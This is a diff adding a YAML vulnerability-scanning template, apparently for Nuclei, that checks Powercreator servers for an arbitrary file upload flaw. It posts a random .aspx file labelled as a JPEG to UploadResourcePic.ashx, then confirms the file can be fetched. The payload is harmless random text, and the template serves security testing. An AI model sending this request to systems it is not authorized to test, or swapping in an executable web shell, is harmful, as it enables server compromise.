@@ -1,0 +1,59 @@
+id: powercreator-arbitrary-file-upload
+info:
+  name: Powercreator Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    Powercreator arbitrary file upload vulnerability allows attackers to upload and execute unauthorized files on the server.
+  tags: file-upload
+
+variables:
+  rand: '{{rand_int(1000, 9999)}}'
+  content: '{{rand_text_alphanumeric(8)}}'
+  randname: '{{rand_text_alphanumeric(4)}}'
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - '{{BaseURL}}/upload/UploadResourcePic.ashx?ResourceID={{rand}}'
+    headers:
+      Content-Type: multipart/form-data; boundary=---------------------------20873900192357278038549710136
+    body: |-
+      -----------------------------20873900192357278038549710136
+      Content-Disposition: form-data; name="file1"; filename="{{randname}}.aspx"
+      Content-Type: image/jpeg
+
+      {{content}}
+      -----------------------------20873900192357278038549710136--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - ".*\\.ASPX"
+    extractors:
+      - type: regex
+        name: file-path
+        group: 1
+        regex:
+          - "(?P<path>.+?)\\.ASPX"
+        internal: true
+
+  - id: verify-upload
+    method: GET
+    path:
+      - '{{BaseURL}}/ResourcePic/{{file-path}}.ASPX'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '{{content}}'
